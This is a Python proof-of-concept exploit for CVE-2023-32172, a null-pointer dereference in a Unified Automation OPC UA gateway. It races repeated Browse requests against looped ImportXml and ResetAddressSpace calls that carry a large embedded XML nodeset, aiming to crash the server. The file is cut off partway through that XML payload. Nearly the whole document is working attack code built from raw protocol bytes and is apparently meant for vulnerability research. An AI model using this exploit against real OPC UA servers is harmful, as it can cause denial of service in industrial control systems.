import _thread
# Address space null item: Null-pointer dereference
#   Adding nodes (using XML) to the server address space and removing the nodes in a loop while browsing the entire address space.
#   This causes the server to access a node that has already been removed from the address space
#
# CVEs:
#   - CVE-2023-32172: https://documentation.unified-automation.com/uagateway/1.5.14/CHANGELOG.txt
#
from protocol import *


def unified_browse_objects(server_details):
    program_type, ip_addr, port, query_string = server_details
    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    for i in range(10000):
        message_header = opcua.build_opcua_message_header()

        message_body = opcua.build_opcua_message_body(type_id=1, req_id=527)
        message_body += bytes.fromhex("0000000000000000000000000000")  # View
        message_body += bytes.fromhex("64000000")  # RequestedMaxReferencesPerNode
        message_body += bytes.fromhex("01000000005500000000002101000000003f000000")  # NodesToBrowse

        print("[-] Sending MSG Request - Browse Root")
        message = message_header + message_body
        opcua.send_recv(message, 1, should_recv=True)


def unified_importxml_resetaddressspace(server_details):
    program_type, ip_addr, port, query_string = server_details
    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # Send ImportXml/ResetAddressSpace in a loop
    for i in range(10000):
        # Send ImportXml
        message_header = opcua.build_opcua_message_header()
        message_body = opcua.build_opcua_message_body(type_id=1, req_id=712)
        # This is the address space XML we add. We use a pretty big xml to increase the probability we browse a freed address space object
        message_body += b'\x01\x00\x00\x00\x03\x01\x00\x11\x00\x00\x00TagFile.MethodSet\x03\x01\x00\x11\x00\x00\x00TagFile.ImportXml\x01\x00\x00\x00\x0f\xcd\x93\x00\x00<?xml version=\'1.0\' encoding=\'utf-8\'?>\n<UANodeSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:uax="http://opcfoundation.org/UA/2008/02/Types.xsd" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns="http://opcfoundation.org/UA/2011/03/UANodeSet.xsd">\n  <NamespaceUris>\n    <Uri>http//freeopcua/defaults/modeler</Uri>\n  </NamespaceUris>\n  <Aliases>\n    <Alias Alias="Boolean">i=1</Alias>\n    <Alias Alias="UInt16">i=5</Alias>\n    <Alias Alias="UInt32">i=7</Alias>\n    <Alias Alias="UInt64">i=9</Alias>\n    <Alias Alias="String">i=12</Alias>\n    <Alias Alias="NodeId">i=17</Alias>\n    <Alias Alias="Organizes">i=35</Alias>\n    <Alias Alias="HasTypeDefinition">i=40</Alias>\n    <Alias Alias="HasComponent">i=47</Alias>\n    <Alias Alias="XmlElement">i=16</Alias>\n    <Alias Alias="HasProperty">i=46</Alias>\n    <Alias Alias="UtcTime">i=294</Alias>\n    <Alias Alias="Argument">i=296</Alias>\n  </Aliases>\n  <UAObject NodeId="ns=1;i=2001" BrowseName="1:MyTypes" ParentNodeId="i=85">\n    <DisplayName>MyTypes</DisplayName>\n    <Description>MyTypes</Description>\n    <References>\n      <Reference ReferenceType="Organizes" IsForward="false">i=85</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=61</Reference>\n      <Reference ReferenceType="Organizes">ns=1;i=2002</Reference>\n      <Reference ReferenceType="Organizes">ns=1;i=2046</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2047</Reference>\n      <Reference ReferenceType="Organizes">ns=1;i=2048</Reference>\n    </References>\n  </UAObject>\n  <UAObject NodeId="ns=1;i=2002" BrowseName="1:MyDirectory" ParentNodeId="ns=1;i=2001">\n    <DisplayName>MyDirectory</DisplayName>\n    <References>\n      <Reference ReferenceType="Organizes" IsForward="false">ns=1;i=2001</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=13353</Reference>\n      <Reference ReferenceType="Organizes">ns=1;i=2003</Reference>\n      <Reference ReferenceType="Organizes">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2035</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2038</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2041</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2043</Reference>\n    </References>\n  </UAObject>\n  <UAObject NodeId="ns=1;i=2003" BrowseName="0:&lt;FileDirectoryName&gt;" ParentNodeId="ns=1;i=2002">\n    <DisplayName>&lt;FileDirectoryName&gt;</DisplayName>\n    <References>\n      <Reference ReferenceType="Organizes" IsForward="false">ns=1;i=2002</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=13353</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2004</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2007</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2010</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2012</Reference>\n    </References>\n  </UAObject>\n  <UAMethod NodeId="ns=1;i=2004" BrowseName="0:CreateDirectory" ParentNodeId="ns=1;i=2003">\n    <DisplayName>CreateDirectory</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2003</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2005</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2006</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2005" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2004" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2004</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2006" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2004" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2004</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2007" BrowseName="0:CreateFile" ParentNodeId="ns=1;i=2003">\n    <DisplayName>CreateFile</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2003</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2008</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2009</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2008" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2007" ValueRank="1" ArrayDimensions="2" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2007</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2009" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2007" ValueRank="1" ArrayDimensions="2" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2007</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2010" BrowseName="0:Delete" ParentNodeId="ns=1;i=2003">\n    <DisplayName>Delete</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2003</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2011</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2011" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2010" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2010</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2012" BrowseName="0:MoveOrCopy" ParentNodeId="ns=1;i=2003">\n    <DisplayName>MoveOrCopy</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2003</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2013</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2014</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2013" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2012" ValueRank="1" ArrayDimensions="4" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2012</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2014" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2012" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2012</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAObject NodeId="ns=1;i=2015" BrowseName="0:&lt;FileName&gt;" ParentNodeId="ns=1;i=2002">\n    <DisplayName>&lt;FileName&gt;</DisplayName>\n    <References>\n      <Reference ReferenceType="Organizes" IsForward="false">ns=1;i=2002</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=11575</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2016</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2017</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2018</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2019</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2020</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2023</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2025</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2028</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2030</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2033</Reference>\n    </References>\n  </UAObject>\n  <UAVariable NodeId="ns=1;i=2016" BrowseName="0:Size" ParentNodeId="ns=1;i=2015" DataType="UInt64" Historizing="true">\n    <DisplayName>Size</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2017" BrowseName="0:Writable" ParentNodeId="ns=1;i=2015" DataType="Boolean" Historizing="true">\n    <DisplayName>Writable</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2018" BrowseName="0:UserWritable" ParentNodeId="ns=1;i=2015" DataType="Boolean" Historizing="true">\n    <DisplayName>UserWritable</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2019" BrowseName="0:OpenCount" ParentNodeId="ns=1;i=2015" DataType="UInt16" Historizing="true">\n    <DisplayName>OpenCount</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2020" BrowseName="0:Open" ParentNodeId="ns=1;i=2015">\n    <DisplayName>Open</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2021</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2022</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2021" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2020" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2020</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2022" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2020" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2020</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2023" BrowseName="0:Close" ParentNodeId="ns=1;i=2015">\n    <DisplayName>Close</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2024</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2024" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2023" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2023</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2025" BrowseName="0:Read" ParentNodeId="ns=1;i=2015">\n    <DisplayName>Read</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2026</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2027</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2026" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2025" ValueRank="1" ArrayDimensions="2" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2025</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2027" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2025" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2025</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2028" BrowseName="0:Write" ParentNodeId="ns=1;i=2015">\n    <DisplayName>Write</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2029</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2029" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2028" ValueRank="1" ArrayDimensions="2" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2028</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2030" BrowseName="0:GetPosition" ParentNodeId="ns=1;i=2015">\n    <DisplayName>GetPosition</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2031</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2032</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2031" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2030" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2030</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2032" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2030" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2030</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2033" BrowseName="0:SetPosition" ParentNodeId="ns=1;i=2015">\n    <DisplayName>SetPosition</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2015</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2034</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2034" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2033" ValueRank="1" ArrayDimensions="2" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2033</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2035" BrowseName="0:CreateDirectory" ParentNodeId="ns=1;i=2002">\n    <DisplayName>CreateDirectory</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2002</Reference>\n    </References>\n  </UAMethod>\n  <UAMethod NodeId="ns=1;i=2038" BrowseName="0:CreateFile" ParentNodeId="ns=1;i=2002">\n    <DisplayName>CreateFile</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2002</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2039</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2040</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2039" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2038" ValueRank="1" ArrayDimensions="2" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2038</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2040" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2038" ValueRank="1" ArrayDimensions="2" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2038</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2041" BrowseName="0:Delete" ParentNodeId="ns=1;i=2002">\n    <DisplayName>Delete</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2002</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2042</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2042" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2041" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2041</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2043" BrowseName="0:MoveOrCopy" ParentNodeId="ns=1;i=2002">\n    <DisplayName>MoveOrCopy</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2002</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2044</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2045</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2044" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2043" ValueRank="1" ArrayDimensions="4" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2043</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2045" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2043" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2043</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAObject NodeId="ns=1;i=2046" BrowseName="1:HTTPSCERT" ParentNodeId="ns=1;i=2001">\n    <DisplayName>HTTPSCERT</DisplayName>\n    <References>\n      <Reference ReferenceType="Organizes" IsForward="false">ns=1;i=2001</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=12558</Reference>\n    </References>\n  </UAObject>\n  <UAVariable NodeId="ns=1;i=2047" BrowseName="1:XMLType" ParentNodeId="ns=1;i=2001" DataType="XmlElement">\n    <DisplayName>XMLType</DisplayName>\n    <Description>XMLType</Description>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2001</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=63</Reference>\n    </References>\n  </UAVariable>\n  <UAObject NodeId="ns=1;i=2048" BrowseName="1:certs" ParentNodeId="ns=1;i=2001">\n    <DisplayName>certs</DisplayName>\n    <References>\n      <Reference ReferenceType="Organizes" IsForward="false">ns=1;i=2001</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=12581</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2049</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2076</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2077</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2078</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2079</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2080</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2083</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2084</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2087</Reference>\n    </References>\n  </UAObject>\n  <UAObject NodeId="ns=1;i=2049" BrowseName="0:CertificateGroups" ParentNodeId="ns=1;i=2048">\n    <DisplayName>CertificateGroups</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2048</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=13813</Reference>\n      <Reference ReferenceType="Organizes">ns=1;i=2050</Reference>\n    </References>\n  </UAObject>\n  <UAObject NodeId="ns=1;i=2050" BrowseName="0:DefaultApplicationGroup" ParentNodeId="ns=1;i=2049">\n    <DisplayName>DefaultApplicationGroup</DisplayName>\n    <References>\n      <Reference ReferenceType="Organizes" IsForward="false">ns=1;i=2049</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=12555</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2075</Reference>\n    </References>\n  </UAObject>\n  <UAObject NodeId="ns=1;i=2051" BrowseName="0:TrustList" ParentNodeId="ns=1;i=2050">\n    <DisplayName>TrustList</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2050</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=12522</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2052</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2053</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2054</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2055</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2056</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2059</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2061</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2064</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2066</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2069</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2071</Reference>\n      <Reference ReferenceType="HasComponent">ns=1;i=2072</Reference>\n    </References>\n  </UAObject>\n  <UAVariable NodeId="ns=1;i=2052" BrowseName="0:Size" ParentNodeId="ns=1;i=2051" DataType="UInt64" Historizing="true">\n    <DisplayName>Size</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2053" BrowseName="0:Writable" ParentNodeId="ns=1;i=2051" DataType="Boolean" Historizing="true">\n    <DisplayName>Writable</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2054" BrowseName="0:UserWritable" ParentNodeId="ns=1;i=2051" DataType="Boolean" Historizing="true">\n    <DisplayName>UserWritable</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2055" BrowseName="0:OpenCount" ParentNodeId="ns=1;i=2051" DataType="UInt16" Historizing="true">\n    <DisplayName>OpenCount</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2056" BrowseName="0:Open" ParentNodeId="ns=1;i=2051">\n    <DisplayName>Open</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2057</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2058</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2057" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2056" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2056</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2058" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2056" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2056</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2059" BrowseName="0:Close" ParentNodeId="ns=1;i=2051">\n    <DisplayName>Close</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2060</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2060" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2059" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2059</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2061" BrowseName="0:Read" ParentNodeId="ns=1;i=2051">\n    <DisplayName>Read</DisplayName>\n    <References>\n      <Reference ReferenceType="HasComponent" IsForward="false">ns=1;i=2051</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2062</Reference>\n      <Reference ReferenceType="HasProperty">ns=1;i=2063</Reference>\n    </References>\n  </UAMethod>\n  <UAVariable NodeId="ns=1;i=2062" BrowseName="0:InputArguments" ParentNodeId="ns=1;i=2061" ValueRank="1" ArrayDimensions="2" DataType="Argument" Historizing="true">\n    <DisplayName>InputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2061</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAVariable NodeId="ns=1;i=2063" BrowseName="0:OutputArguments" ParentNodeId="ns=1;i=2061" ValueRank="1" ArrayDimensions="1" DataType="Argument" Historizing="true">\n    <DisplayName>OutputArguments</DisplayName>\n    <References>\n      <Reference ReferenceType="HasProperty" IsForward="false">ns=1;i=2061</Reference>\n      <Reference ReferenceType="HasTypeDefinition">i=68</Reference>\n    </References>\n  </UAVariable>\n  <UAMethod NodeId="ns=1;i=2064" BrowseName="0:Write" ParentNodeId="ns=1;i=2051">\n    <DisplayName>Write</DisplayName>\n    <References>\n      